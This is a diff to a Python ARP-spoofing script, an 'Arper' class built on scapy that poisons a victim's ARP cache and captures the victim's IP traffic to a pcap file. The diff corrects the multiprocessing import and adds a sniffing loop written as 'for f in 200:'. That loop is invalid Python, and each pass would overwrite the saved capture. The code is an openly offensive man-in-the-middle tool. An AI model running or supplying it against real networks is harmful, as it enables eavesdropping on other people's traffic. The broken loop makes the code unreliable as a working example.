@@ -1,5 +1,5 @@
 #! /usr/bin/env python
-from multiprocessing import process
+from multiprocessing import Process
 from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
 
 import os, sys, time
@@ -32,10 +32,10 @@ class Arper:
         print("-"*30)
 
     def run(self):
-        self.poison_thread = process(target=self.poison)
+        self.poison_thread = Process(target=self.poison)
         self.poison_thread.start()
 
-        self.sniff_thread = process(target=self.sniff)
+        self.sniff_thread = Process(target=self.sniff)
         self.sniff_thread.start()
 
     def poison(self):
@@ -80,8 +80,9 @@ class Arper:
         time.sleep(5)
         print(f"Sniffing {count} packets")
         bpf_filter = "ip host %s" % victim
-        pkts = sniff(count=count, filter=bpf_filter, iface=self.interface)
-        wrpcap('arper.pcap', pkts)
+        for f in 200:
+            pkts = sniff(count=1, filter=bpf_filter, iface=self.interface)
+            wrpcap('arper.pcap', pkts)
         print("got the packets")
         self.restore()
         self.poison_thread.terminate()
